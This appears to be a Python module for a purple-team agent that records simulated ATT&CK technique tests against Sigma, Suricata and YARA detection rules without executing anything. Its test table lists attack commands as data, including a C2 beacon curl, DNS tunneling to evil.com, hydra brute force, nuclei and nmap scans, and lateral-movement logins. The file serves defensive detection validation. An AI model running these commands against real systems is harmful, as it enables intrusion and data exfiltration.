"""Purple-Team Agent — runs simulated ATT&CK technique validations against detection controls."""

import logging
import time
from datetime import UTC, datetime

from sqlalchemy import select

from backend.models.validation import ValidationRun, ValidationStep
from backend.services.agents.base import BaseAgent

logger = logging.getLogger(__name__)

# Atomic test library — maps technique IDs to simulated test scenarios
ATOMIC_TESTS = {
    "T1059": {
        "name": "Command and Scripting Interpreter",
        "tests": [
            {
                "test_name": "PowerShell execution test",
                "command": "powershell.exe -NoProfile -Command Write-Output 'test'",
                "expected_detection": "Sigma rule: proc_creation_win_powershell_suspicious",
            },
            {"test_name": "Bash script execution test", "command": "bash -c 'echo test'",
             "expected_detection": "Sigma rule: proc_creation_lnx_bash_interactive"},
        ],
    },
    "T1071": {
        "name": "Application Layer Protocol",
        "tests": [
            {"test_name": "HTTP C2 beacon simulation", "command": "curl -s http://test-c2.local/beacon",
             "expected_detection": "Suricata rule: ET MALWARE CnC Beacon"},
            {"test_name": "DNS tunneling test", "command": "nslookup encoded-data.evil.com",
             "expected_detection": "Suricata rule: ET DNS Long DNS Query"},
        ],
    },
    "T1110": {
        "name": "Brute Force",
        "tests": [
            {"test_name": "SSH brute force simulation", "command": "hydra -l admin -P wordlist.txt ssh://target",
             "expected_detection": "Sigma rule: net_connection_lnx_ssh_bruteforce"},
        ],
    },
    "T1190": {
        "name": "Exploit Public-Facing Application",
        "tests": [
            {"test_name": "Web vulnerability scan", "command": "nuclei -t cves/ -u http://target",
             "expected_detection": "Suricata rule: ET SCAN nuclei scanner"},
        ],
    },
    "T1078": {
        "name": "Valid Accounts",
        "tests": [
            {"test_name": "Credential stuffing test", "command": "curl -X POST /api/login -d 'user=admin&pass=test'",
             "expected_detection": "Sigma rule: web_multiple_failed_logins"},
        ],
    },
    "T1021": {
        "name": "Remote Services",
        "tests": [
            {"test_name": "Lateral movement via RDP", "command": "mstsc /v:target-host",
             "expected_detection": "Sigma rule: net_connection_win_rdp_to_uncommon_target"},
            {"test_name": "Lateral movement via SSH", "command": "ssh admin@target-host",
             "expected_detection": "Sigma rule: net_connection_lnx_ssh_lateral"},
        ],
    },
    "T1046": {
        "name": "Network Service Discovery",
        "tests": [
            {"test_name": "Port scan detection", "command": "nmap -sV -p 1-1000 target",
             "expected_detection": "Suricata rule: ET SCAN Nmap"},
        ],
    },
    "T1486": {
        "name": "Data Encrypted for Impact",
        "tests": [
            {"test_name": "Ransomware file encryption simulation", "command": "python encrypt_test_files.py --dry-run",
             "expected_detection": "YARA rule: ransomware_file_encryption_pattern"},
        ],
    },
}


def simulation_techniques(values):
    """Validate a bounded supported plan. Unknown entries are not successful tests."""
    if not isinstance(values, list) or not 1 <= len(values) <= 100 or any(
            not isinstance(value, str) or value not in ATOMIC_TESTS for value in values):
        raise ValueError('Choose 1 to 100 supported ATT&CK technique IDs for a simulation plan')
    return list(dict.fromkeys(values))


class PurpleAgent(BaseAgent):
    """Prepare simulation steps, never fabricate observations of detection controls."""

    agent_type = "purple"

    async def run(self, **kwargs) -> dict:
        run_id = kwargs.get('run_id')
        vrun = (await self.db.execute(select(ValidationRun).where(
            ValidationRun.id == run_id, ValidationRun.user_id == self.user_id).with_for_update())).scalar_one_or_none()
        if not vrun:
            return {'error': 'Validation run not found'}
        if vrun.mode not in ('dry_run', 'lab'):
            return {'error': 'Live execution is unavailable. Only dry-run or lab simulation plans are supported.'}
        if vrun.status not in ('pending', 'failed'):
            return {'error': 'This validation run cannot be prepared again'}
        existing = (await self.db.execute(select(ValidationStep.id).where(
            ValidationStep.run_id == run_id).limit(1))).scalar_one_or_none()
        if existing is not None or vrun.results_summary is not None:
            return {'error': 'Saved evidence already exists. Create a new run to preserve prior evidence.'}
        techniques = simulation_techniques(vrun.mitre_techniques)
        vrun.status = 'running'
        vrun.started_at = datetime.now(UTC)
        try:
            async with self.db.begin_nested():
                await self.log_step('start_simulation_plan', output_summary=(
                    f'Run {run_id}: metadata-only simulation for {len(techniques)} supported techniques. '
                    'No command execution, network probing or detection measurement. Lab mode is also simulated.'))
                count = 0
                for tech_id in techniques:
                    atomic = ATOMIC_TESTS[tech_id]
                    for test in atomic['tests']:
                        count += 1
                        start = time.monotonic()
                        step = ValidationStep(
                            run_id=run_id, step_number=count, technique_id=tech_id, technique_name=atomic['name'],
                            test_name=test['test_name'], test_type='simulation_plan', simulated=True,
                            command=f"[NOT EXECUTED, SIMULATION PLAN] {test['command']}",
                            expected_detection=test['expected_detection'], status='completed',
                            actual_result='simulated_unmeasured', executed_at=None,
                            evidence={'kind': 'simulation_only', 'command_executed': False,
                                      'detection_measured': False},
                            duration_ms=max(0, int((time.monotonic() - start) * 1000)))
                        self.db.add(step)
                        await self.log_step('prepare_simulation_step', f"{tech_id}: {test['test_name']}",
                                            'Plan recorded; command not executed and detection not measured.')
                vrun.status = 'completed'
                vrun.completed_at = datetime.now(UTC)
                vrun.results_summary = {'measurement_mode': 'simulation_only', 'simulated_tests': count,
                    'tested': 0, 'detected': 0, 'missed': 0, 'detection_rate': None,
                    'agent_run_id': self._run.id}
                summary = f'Simulation steps prepared: {count}; no commands executed and detection was not measured.'
                await self.log_step('complete_simulation_plan', output_summary=summary)
                await self.db.flush()
        except Exception:
            vrun.status = 'failed'
            vrun.completed_at = datetime.now(UTC)
            raise
        return {'run_id': run_id, 'status': 'completed', 'results': vrun.results_summary, 'summary': summary}
